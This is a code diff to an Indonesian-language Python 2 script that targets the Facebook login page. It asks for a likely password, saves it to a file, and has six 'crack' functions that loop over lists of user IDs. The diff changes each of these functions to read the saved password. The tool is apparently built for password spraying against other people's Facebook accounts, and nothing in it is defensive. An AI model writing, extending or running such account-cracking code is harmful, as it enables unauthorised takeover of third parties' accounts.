@@ -15,16 +15,15 @@ try:
 except ImportError:
     raw_input(" Kamu Blom Install Modul Mechanize..? \n Silahkan Tekan Enter Untuk Menginstall..")
     os.system('pip install mechanize' if os.name == 'nt' else 'pip2 install mechanize')
-
+print "\033[96m"
 p = []
-# passs = []
 
 def lup():
     pas = raw_input('\n {$} Password Yang Mungkin Digunakan, Contoh: dinda123\n  => ')
     lip = open('pass.txt', 'w')
     lip.write(pas)
     lip.close()
-#     passs.append(pas)
+
     print "\n     Selamat Mencoba, Semoga Beruntung :) \n"
 
 data1 = []
@@ -96,7 +95,7 @@ lol = 'https://www.facebook.com/login.php?login_attempt=1'
 
 
 def crack1(ival):
-   
+    passs = open('pass.txt', 'r').read()
     for us in ival:
       try:
         w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
@@ -124,7 +123,7 @@ def crack1(ival):
         pass
 
 def crack2(iqbal):
- 
+    passs = open('pass.txt', 'r').read()
     for user in iqbal:
       try:
         w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
@@ -151,6 +150,7 @@ def crack2(iqbal):
         pass
 
 def crack3(dev_id):
+    passs = open('pass.txt', 'r').read()
     for user3 in dev_id:
         try:
             w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
@@ -180,7 +180,7 @@ def crack3(dev_id):
 
 # sdffffffffffffffffffffffffffffffffffffffffffffff
 def crack4(ival1):
-   
+    passs = open('pass.txt', 'r').read()
     for us1 in ival1:
       try:
         w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
@@ -208,7 +208,7 @@ def crack4(ival1):
         pass
 
 def crack5(iqbal2):
- 
+    passs = open('pass.txt', 'r').read()
     for user2 in iqbal2:
       try:
         w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
@@ -235,6 +235,7 @@ def crack5(iqbal2):
         pass
 
 def crack6(dev_id3):
+    passs = open('pass.txt', 'r').read()
     for user6 in dev_id3:
         try:
             w = time.strftime("%Y-%m-%d %H:%S", time.localtime())
